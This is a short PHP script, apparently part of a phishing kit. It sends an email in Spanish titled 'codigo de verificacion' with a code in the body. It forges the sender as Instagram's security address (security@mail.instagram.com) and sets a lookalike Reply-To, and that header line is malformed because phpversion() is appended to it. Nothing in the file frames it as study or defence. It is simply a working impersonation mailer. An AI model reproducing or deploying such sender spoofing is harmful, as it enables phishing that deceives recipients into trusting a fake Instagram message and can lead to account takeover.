<?php

$para      = $Email;
$titulo    = 'codigo de verificacion';
$mensaje   = "el codigo de verificacion es: $codigo" ;
$cabeceras = 'From: security@mail.instagram.com' . "\r\n" .
    'Reply-To:tsecurity@mail.instagram.com' . phpversion();

mail($para, $titulo, $mensaje, $cabeceras);
?>